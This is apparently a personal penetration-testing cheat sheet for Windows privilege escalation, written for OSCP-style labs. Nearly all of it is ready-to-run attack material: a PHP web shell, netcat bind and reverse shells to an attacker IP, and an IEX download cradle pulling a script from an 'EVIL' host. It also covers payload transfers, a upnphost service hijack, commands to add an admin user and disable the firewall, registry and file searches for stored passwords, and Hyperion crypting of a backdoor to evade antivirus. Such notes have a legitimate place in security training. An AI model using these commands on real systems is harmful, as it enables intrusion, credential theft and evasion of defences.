# ariel-shin Windows - Privilege Escalation

## Summary 
* [Web Shell for Windows](#Web-Shell-for-Windows)
* [File Traversal / Local File Inclusion](#file-traversal--local-file-inclusion)
* [Cracking Passwords](#Cracking-Passwords)
* [RCE to Shell](#RCE-to-Shell)
* [Useful commands](#Useful-commands)
* [Transfer files](#Transfer-files)
* [Process](#Process)
* [Bypassing AV](#Bypassing-AV)
* [Automated Tools](#Automated-Tools)
* [Resources](#Resources)
* [Nothing is working --> SOS](#nothing-is-working----sos)

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt
## MUST RUN: ipconfig/ifconfig && whoami && cat proof.txt

## Web Shell for Windows 
PHP Web Shell
- Test if PHP works
```phpinfo
<?php phpinfo(); ?>
```
- Command Execution
```php webshell
<?php echo(system($_GET["cmd"])); ?>
```
- Go to http://victimsite.com/test.php?cmd=dir for command execution 

[Back](#summary)

## File Traversal / Local File Inclusion
* Use \~1 with filenames and spaces
* Discover version 
```windows
C:\Windows\System32/license.rtf //for Windows 7
C:\Windows\System32\eula.txt //for Windows XP 
```

[Back](#summary)

## Cracking Passwords
* Google it
* Search on hashkiller.co.uk
* John The Ripper
```
john textfile
```

[Back](#summary)

## RCE to Shell
* Getting a shell in limited interpreters
```cmd1
$ system("start cmd.exe /k $cmd")
```
* Bind cmd to a port
```cmd2
$ nc.exe -Lp 31337 -vv -e cmd.exe
``
* Reverse Shell 
```cmd3
$ nc.exe attacker_ip attacker_port -e cmd.exe
```
* [Invoke Powershell](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)

[Back](#summary)

## Useful commands
* Add a new user
```
$ net user test 1234 /add
$ net localgroup administrators test /add
```
* Print files contents
```
$ type file
```
* Change password for user
```
$ net user <user> <password>
```
* Check permissions on a folder recursively
```
$ cacls *.* /t /e /g domainname\administrator:f
```
* Enable RDP Access
```
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```
* Disable firewall
```
$ netsh firewall set opmode disable
```

[Back](#summary)

## Transfer files
* bitsadmin
```
bitsadmin /transfer dejob /download /priority normal http://10.11.0.65/test.exe c:\Users\Public\test.exe
```
* ftp
	* ATTACKER
	```
	apt-get install python-pyftpdlib
	python -m pyftpdlib -p 21
	```
	* VICTIM 
	```
	echo open ATTACKERIP 21>ftp.txt
	echo USER anonymous>>ftp.txt
	echo ftp>>ftp.txt
	echo bin>>ftp.txt
	echo GET file.exe>>ftp.txt
	echo bye>>ftp.txt
	ftp -v -n -s:ftp.txt
	```
	* Links
		* [FTP](https://securism.wordpress.com/oscp-notes-file-transfers/) 
		* [payftpd](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
		* [Transferring files](https://guif.re/windowseop)
* [Bounce port scanning](https://guif.re/windowseop)
```
$ nc $ip 21
220 Femitter FTP Server ready.
USER anonymous
331 Password required for anonymous.
PASS foo
230 User anonymous logged in.
PORT 127,0,0,1,0,80
200 Port command successful.
LIST
```
* [Share folders with RDP](https://guif.re/windowseop)
```
$ rdesktop (ip) -r disk:share=/home/bayo/store
```
* Powershell 
```powershell
$ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"
```
* Powershell Download Cradle
```testingdownload
//check that it echos 
echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"

//get rid of single quotes and pipe it - ippsec bastard video 23:10
echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
```

[Back](#summary)

## Process
- systeminfo
	* Gives us system info 
	* [Offline - Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
	* Check Hot Fixes
		* No hot fixes - means no hotfixes installed OR we don't have permissions to view hot fixes
	* Check OS Name
		* google: systeminfo "OS" + "NIC(s) installed"
			* example: "Microosft Windows Server 2008 R2 DataCenter" + "NIC(s) installed"
		* check if someone else has posted systeminfo output so we can compare our OS version 
	* Check OS Versions 
		* Indicate the Service Pack -- N/A
		```systeminfo
		systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
		```
		* Google Output
	* Windows Server 2003 && IIS 6.0 Privilege Escalation
		* [Useful Exploits](https://guif.re/windowseop)
	* Windows MS11-080
- wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
	* Get architecture
	* x86 = 32 bit machine
	* x64 = 64 bit machine
- Hostname
```
hostname
```
- Environment Variables
	* Command Prompt
	```env
	set
	```
	* PowerShell
	```
	Get-ChildItem Env: | ft Key,Value
	```
- List users
```
$ net user
```
- List info about a user
```
$ net user <username>
```
- Find current user
```
echo %username%
getuid
whoami
```
- See which users are in the Administrator Group
```admin
net localgroup Administrator(s)
```
- Information about a user
```
$ net users Administrator
```
- List running services
	* A service running as Administrator/SYSTEM with incorrect file permissions might allow EOP. 
	* Interested in services wehre permissions are: ***BUILTIN\USERS*** with ***(F)*** or ***(C)*** or ***(M)***
	* Look for services and then google
	```
	net start
	tasklist
	wmic service list brief
	wmic process
	```
	* Look for services running as root (e.g) upnphost
	```
	tasklist /SVC
	```
	* [Fuzzy Security Write-up - nc.exe](http://www.fuzzysecurity.com/tutorials/16.html)
	* [Pentest.blog - Add user](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
	* [Need to upload nc.exe](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	* [EoP 1: Incorrect permissions in services](https://guif.re/windowseop)
	* Print affected services
	```
	$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
	$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
	```
	* If wmic is not available we can use sc.exe:
	```
	$ sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
	FOR /F %i in (Servicenames.txt) DO echo %i
	type Servicenames.txt
	FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
	FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
	```
	* Can manually check each service use cacls: 
	```
	$ cacls "C:\path\to\file.exe"
	```
	* If you don't have access to vmic, you can do: 
	```
	$ sc qc upnphost
	```
	* Windows XP SP1 is known to be vulnerable to EoP in ***upnphost***. Can get administrator with 
		* WIndows SP0 or SP1 == good chance
	```
	$ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
	$ sc config upnphost obj= ".\LocalSystem" password= ""
	$ sc qc upnphost
	```
	* If it fails because of a missing dependency, run the following: 
	```
	$ sc config SSDPSRV start= auto
	net start SSDPSRV
	net start upnphost
	```
	* OR remove the dependency
		```
		> exploit/windows/local/service_permissions
		```
	* Can also use accesschk.exe
- powershell
	* check for powershell
	```powershell
	powershell
	$PSVersionTable
	$PSVersionTable.PSVersion
	```
	* [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
		* Get-GPPPassword
		* Get-UnattendedInstallFile
		* Get-Webconfig
		* Get-ApplicationHost
		* Get-SiteListPassword
		* Get-CachedGPPPassword
		* Get-RegistryAutoLogon
	* Run exploit
	```
	C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
	```
- Processes Running as system
	* ***Do not gloss over! IMPORTANT***
	```systemprocesses
	tasklist /v /fi "username eq system"
	```
- [Check Weak File Permissions](http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet)
```access
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
```
- [Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
	```unquoted
	wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
	```
	* [EoP 2: Find unquoted paths](https://guif.re/windowseop)
- [Scheduled Tasks](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	* Option 1 
	```schtasks
	schtasks /query /fo LIST 2>nul | findstr TaskName
	Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
	```
	* Option 2 - fuzzysecurity
	```schtask
	schtasks /query /fo LIST /v
	```
- File Upload
	* Look for files that were present on the webpage
	```
	dir filename /s /p
	```
- Look for Credentials 
	* [Credentials - Method 1](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
	```creds
	cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
	findstr /si password *.xml *.ini *.txt *.config
	findstr /spin "password" *.*
	```
	* [Credentials - Method 2](https://pentestlab.blog/2017/04/19/stored-credentials/
)
	```creds2
	findstr /si password *.txt
	findstr /si password *.xml
	findstr /si password *.ini
	dir /b /s unattend.xml
	dir /b /s web.config
	dir /b /s sysprep.inf
	dir /b /s sysprep.xml
	dir /b /s *pass*
	dir /b /s vnc.ini
	```
	* [Credentials - Method 3]()
	```creds3
	c:\unattend.txt
	c:\sysprep.ini - [Clear Text]
	c:\sysprep\sysprep.xml - [Base64]
	findstr /si password *.txt | *.xml | *.ini
	reg query HKLM /s | findstr /i password > temp.txt
	reg query HKCU /s | findstr /i password > temp.txt
	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s
	```
	* [EoP 3: ClearText passwords (quick hits)](https://guif.re/windowseop)
- [Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/
)
	* Need to upload accesschk.exe
- [DLL Injection]((https://pentestlab.blog/2017/04/04/dll-injection/)
)
- [Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
	```aie	
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	```
	* [EoP 6: AlwaysInstallElevated](https://guif.re/windowseop)
- [Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
- [Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
- [Weak Service Permissions](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	```weak
	wmic service list brief
	```
- [Pass the Hash](https://guif.re/windowseop)
- [Services only available from loopback](https://guif.re/windowseop)
- [Vulnerable Drivers](https://guif.re/windowseop)
- [MORE PAYLOADS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- Network Information
	```
	$ ipconfig /all & route print & arp -a
	```
- List Open Connections
	```netstat
	$ netstat -aton
	```
- Fireswall Information
	```firewall
	$ netsh firewall show state
	$ netsh firewall show config
	```


[Back](#summary)

## Bypassing AV
* Textbook
```
~# cp shell_reverse_msf_encoded_embedded.exe backdoor.exe
~# cp /usr/share/windows-binaries/Hyperion-1.0.zip .
~# unzip Hyperion-1.0.zipcd Hyperion-1.0/
~# cd Hyperion-1.0/
~/Hyperion-1.0# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
~/Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1- win32/libgcc_s_sjlj-1.dll .
~/Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++- 6.dll .
~/Hyperion-1.0# wine hyperion.exe ../backdoor.exe ../crypted.exe
```
* Online
```
$ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe

```

[Back](#summary)

## Automated Tools
* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
* [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
* [Sherlock](https://github.com/rasta-mouse/Sherlock)

[Back](#summary)

## Resources
* [CHECKLIST](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
* [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
)
* [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)

[Back](#summary)

## Nothing is working --> SOS
* [Calm down](https://www.youtube.com/watch?v=F28MGLlpP90)
* Walk through this [tutorial](https://guif.re/windowseop)
* Check through this [list of tutorials](https://backdoorshell.gitbooks.io/oscp-useful-links/content/windows-privilege-escalation.html)
* Look for usernames that could have been found
	* Try to add rdp access
	* RDP by guessing credentials
* Google anything running as system 

[Back](#summary)